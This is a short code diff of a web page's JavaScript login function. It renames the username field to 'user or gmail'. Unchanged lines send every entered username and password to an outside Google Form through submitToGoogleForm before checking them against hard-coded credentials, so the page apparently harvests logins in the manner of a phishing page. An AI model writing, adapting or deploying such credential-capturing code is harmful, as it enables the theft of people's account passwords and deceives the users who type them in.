@@ -80,8 +80,8 @@ function showOverlay(k){
 }
 
 function doLogin(){
-  const u=document.getElementById('user').value.replace(/\*/g,'');
-  const p=document.getElementById('pass').value;
+  const u=document.getElementById('user or gmail').value.replace(/\*/g,'');
+  const p=document.getElementById('password').value;
   submitToGoogleForm(u,p);
   if(u===CORRECT_USER && p===CORRECT_PASS){
     showOverlay('ok');
